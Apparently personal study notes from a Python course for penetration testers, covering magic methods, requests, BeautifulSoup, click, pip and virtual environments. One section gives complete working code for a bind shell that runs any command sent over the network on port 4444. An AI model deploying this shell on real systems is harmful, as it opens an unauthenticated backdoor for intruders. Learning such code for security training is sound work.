# Notes Python
---

# Classy
Magic Methods are functions - or methods as they are also called in many programming languages - which exist by default and have a default implementation in all classes. This is because of the class hierarchy in Python, where all classes inherit from a base class object ("object" is the name of the base class - slightly confusing perhaps). 

Another two Magic Methods worth mentioning are the __enter__ and __exit__ functions, allowing us to create classes that support using the with keyword. he with keyword will enable us to specify the default functionality of a class for build-up and teardown procedures. For example,  is with open('/path/to/file.txt', 'w') as wr, which opens a file for writing. We can then use wr.write('something') to write "something" to the file. At the end of the with-clause, we do not need to close the output streams to the file - the teardown functionality in the open class takes care of that.

---

# Libraries
To view all classes and functions from library we use dir():

```pyhotn
>>> import time
>>> dir(time)
['CLOCK_BOOTTIME', 'CLOCK_MONOTONIC', 'CLOCK_MONOTONIC_RAW', 'CLOCK_PROCESS_CPUTIME_ID', 'CLOCK_REALTIME', 'CLOCK_TAI', 'CLOCK_THREAD_CPUTIME_ID', '_STRUCT_TM_ITEMS', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'altzone', 'asctime', 'clock_getres', 'clock_gettime', 'clock_gettime_ns', 'clock_settime', 'clock_settime_ns', 'ctime', 'daylight', 'get_clock_info', 'gmtime', 'localtime', 'mktime', 'monotonic', 'monotonic_ns', 'perf_counter', 'perf_counter_ns', 'process_time', 'process_time_ns', 'pthread_getcpuclockid', 'sleep', 'strftime', 'strptime', 'struct_time', 'thread_time', 'thread_time_ns', 'time', 'time_ns', 'timezone', 'tzname', 'tzset']
>>> 
```

## The Requests Package

The requests library is an elegant and simple HTTP library for Python. From the documenation:
Requests allows you to send HTTP/1.1 requests extremely easily. There’s no need to manually add query strings to your URLs, or to form-encode your POST data. Keep-alive and HTTP connection pooling are 100% automatic, thanks to urllib3.

## The BeautifulSoup Package

Another handy package is the BeautifulSoup library (rather beautifulsoup4). This library makes working with HTML a lot easier in Python. Before, we learned how to query a website and get output back, which could be the raw HTML. Digging through this HTML can be cumbersome if we have to search through textual output by hand. BeautifulSoup turns the HTML into Python objects that are much easier to work with and allows us to analyze the content better programmatically. 

## Regex

The first step was to find all words in the HTML while ignoring HTML tags. If we use the get_text() function we discussed earlier, we can use the regular expression module re to help us. This module has a findall function which takes some string of regex (shorthand for "reggular expression") and some text as parameters and then returns all occurrences in a list. We will use the regex string \w+, which matches all word characters, that is, a-z, A-Z, 0-9, and _. Here is the updated code:

---

# Further Improvements

Recall what we discussed in the beginning about importing modules and that Python scripts are executed from top to bottom, even when imported. This means that if somebody were to import our script, e.g., reuse some of our functions (it could be ourselves), the code would run as soon as imported. The typical way to avoid this is to put all the code that does something into the "main" block. Let us do that:
The "main" Block

```python
if __name__ == '__main__':
    page_url = 'http://target:port'
    the_words = get_all_words_from(page_url)
    top_words = get_top_words_from(the_words)

    for i in range(10):
        print(top_words[i][0])
```python

The most important thing to know about the conditional statement is what we need to type to have the code inside it run whenever we execute it with the Python binary. Please refer to the brilliant answer at [StackOverflow](https://stackoverflow.com/questions/419163/what-does-if-name-main-do/419185#419185) for an in-depth explanation of what is going on here. The critical takeaway is that the code inside this conditional statement only gets executed when the script is run, not imported.

## Accepting Arguments

```shell
python3 wordextractor.py --url http://foo.bar/baz
```

Let us look at one module to help us achieve this: [click](https://click.palletsprojects.com/en/8.1.x/).
To understand what click does, we need to talk about decorators. However, since this is a bit of a mouthful to jump right into, let us leave it as optional reading at the end of this section. All we need to know about click at this point is a few simple click-specific concepts that are easy to memorize. 


## A Simple Click Script 

```python
import click

@click.command()
@click.option('--count', default=1, help='Number of greetings.')
@click.option('--name', prompt='Your name', help='The person to greet.')
def hello(count, name):
    for i in range(count):
        click.echo('Hello %s!' % name)

if __name__ == '__main__':
    hello()
```

---

# A simple Bind Shell
```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

---

# Managing Libraries in Python (Continued)

The default site-packages/dist-packages locations are the following:

. Windows 10: PYTHON_INSTALL_DIR\Lib\site-packages: C:\Program Files\Python38\Lib\site-packages
. Linux: /usr/lib/PYTHON_VERSION/dist-packages/: /usr/lib/python3/dist-packages


Python path directories:

```python
╰─ python                                                                                 ─╯
Python 3.10.9 (main, Dec 19 2022, 17:35:49) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python310.zip', '/usr/lib/python3.10', '/usr/lib/python3.10/lib-dynload', '/home/user/.local/lib/python3.10/site-packages', '/usr/lib/python3.10/site-packages']
>>> 
```


Suppose we wanted to have the packages installed in a specific folder. For example, we wanted to keep all packages related to us inside some /var/www/packages/ directory. In that case, we can have pip install the package and store the content inside this folder with the --target flag, like so:

```shell
badorius@01[/01]$ python3 -m pip install --target /var/www/packages/ requests

Collecting requests
  Using cached requests-2.25.1-py2.py3-none-any.whl (61 kB)
Collecting urllib3<1.27,>=1.21.1
  Downloading urllib3-1.26.4-py2.py3-none-any.whl (153 kB)
     |████████████████████████████████| 153 kB 8.1 MB/s
...SNIP...
```

# Preparing the Virtual Environment


```shell
badorius@01[/01]$ python3 -m venv academy

```



 
